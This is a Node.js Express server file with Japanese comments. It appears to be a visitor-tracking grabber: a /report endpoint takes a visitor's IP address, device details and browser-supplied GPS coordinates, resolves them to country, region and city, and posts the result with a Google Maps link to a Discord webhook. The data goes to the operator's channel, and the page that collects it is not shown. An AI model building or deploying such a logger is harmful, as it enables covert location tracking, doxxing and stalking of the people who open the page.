require('dotenv').config();
const express = require('express');
const app = express();
const uaParser = require('ua-parser-js');
const fetch = require('node-fetch');
const path = require('path');

app.use(express.json());
app.use(express.static('public'));

app.post('/report', async (req, res) => {
  const rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  const ip = rawIp.split(',')[0].trim();
  const ua = uaParser(req.headers['user-agent']);
  const { latitude, longitude } = req.body;

  const locationLink = `https://www.google.com/maps?q=${latitude},${longitude}`;

  // 🌍 IPジオロケーションAPI（IPから取得）
  let geo = {};
  try {
    const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
    geo = await geoRes.json();
  } catch (err) {
    console.error('IPジオAPIエラー:', err);
  }

  // 🌍 GPS逆ジオコーディング（緯度経度から取得）
  let gpsAddress = { country: '取得失敗', region: '取得失敗', city: '取得失敗' };
  try {
    const reverseRes = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&accept-language=ja`);
    const reverseData = await reverseRes.json();

    gpsAddress = {
      country: reverseData.address.country || '取得失敗',
      region: reverseData.address.state || '取得失敗',
      city: reverseData.address.city || reverseData.address.town || reverseData.address.village || '取得失敗'
    };
  } catch (err) {
    console.error('GPS逆ジオ取得失敗:', err);
  }

  // 📩 Discordへの通知
  const message = {
    content: `📸 アクセス情報：
- IPアドレス: ${ip}
- 国: ${geo.country_name || gpsAddress.country}
- 地域: ${geo.region || gpsAddress.region}
- 市区町村: ${geo.city || gpsAddress.city}
- 端末: ${ua.device.type || 'PC'} / ${ua.os.name} / ${ua.browser.name}
- 位置情報（GPS）: ${locationLink}
- アクセス時間: ${new Date().toLocaleString()}`
  };

  await fetch(process.env.DISCORD_WEBHOOK, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(message)
  });

  res.sendStatus(200);
});

app.listen(3000, () => {
  console.log('📡 Listening on http://localhost:3000');
});
